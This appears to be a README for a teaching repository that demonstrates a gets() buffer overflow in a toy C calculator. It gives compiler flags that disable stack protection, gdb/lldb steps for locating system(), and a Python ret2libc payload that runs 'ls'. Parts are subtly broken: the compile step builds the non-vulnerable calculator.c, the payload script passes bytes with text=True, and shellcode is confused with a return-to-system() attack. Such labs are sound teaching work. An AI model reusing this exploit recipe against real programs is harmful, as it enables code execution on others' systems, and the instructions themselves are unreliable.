Buffer Overflow Exploitation - Vulnerable Calculator
This repository contains a vulnerable C program designed to demonstrate a buffer overflow vulnerability. The purpose of this project is to show how an attacker can exploit such a vulnerability to execute arbitrary code, such as running system commands.

Files
vulnerable_calculator.c: Contains the vulnerable C code with a buffer overflow vulnerability using the gets() function.
rce_calc.c: Modified version of the calculator that demonstrates remote code execution (RCE) using the buffer overflow.
calculator.c: A basic calculator implementation.

vulnerable_calculator: Compiled executable of the vulnerable calculator program.
README.md: This file containing instructions.
How to Compile the Code
You need to compile the vulnerable calculator first. Use the following commands:


gcc -o vulnerable_calculator calculator.c -fno-stack-protector -z execstack -m32
Explanation:

-fno-stack-protector: Disables stack protection.
-z execstack: Marks the stack as executable, allowing shellcode to run from the stack.
-m32: Compiles the code for a 32-bit architecture to match buffer overflow exploitation techniques.
Running the Code
Without Exploitation (Normal Execution)
To run the vulnerable calculator without exploiting it, simply run:

./vulnerable_calculator
You will be prompted to enter numbers and an operation. The program is vulnerable to a buffer overflow when you enter a large string in the "comment" section.

Exploiting the Vulnerability
To exploit the buffer overflow and potentially execute arbitrary code, you need to overflow the buffer and overwrite the return address with the address of the system() function.

Requirements
gdb or lldb: You'll need a debugger like gdb (for Linux) or lldb (for macOS) to identify memory addresses for the system() function and the "ls" string.
Shellcode: The attacker will need to craft a payload that overflows the buffer, hijacks the return address, and executes arbitrary code.
Steps to Exploit the Vulnerability
Find the Address of system(): Use gdb or lldb to find the address of system() in the binary.

Example using gdb:

gdb ./vulnerable_calculator
(gdb) disassemble system
Example using lldb:


lldb ./vulnerable_calculator
(lldb) disassemble system
Create a Payload: Create a payload that:

Fills the buffer.
Overwrites the return address with the address of system().
Passes the address of "ls" as the argument for system().
Example payload creation:


import sys
import subprocess

system_addr = b"\x12\x34\x56\x78"  # Replace with the actual address of system()
ls_addr = b"\x90\xab\xcd\xef"  # Replace with the actual address of "ls"

payload = b"A" * 50 + system_addr + b"BBBB" + ls_addr
subprocess.run(["./vulnerable_calculator"], input=payload, text=True)
Run the Exploit: Run the vulnerable program with the crafted payload to execute the ls command:


./vulnerable_calculator < input.txt
Ensure that input.txt contains the crafted payload.

Using LLDB or GDB for Debugging
If you are testing the vulnerability and want to see the program’s behavior step by step, use lldb or gdb:

Using LLDB (macOS):
Launch the program with lldb:

lldb ./vulnerable_calculator
(lldb) run
Set breakpoints and inspect the program’s memory to find addresses.

Using GDB (Linux):
Launch the program with gdb:


gdb ./vulnerable_calculator
(gdb) run
Use commands like disassemble and info functions to find the address of functions.

Troubleshooting
Common Issues:
Invalid Address: Ensure that the addresses of system() and "ls" are correct. If the addresses are incorrect, the payload will fail to execute the desired command.
Segmentation Fault: If you get a segmentation fault, the return address might not be correctly aligned or overwritten. Double-check the memory layout and ensure you have the correct return address and function pointers.
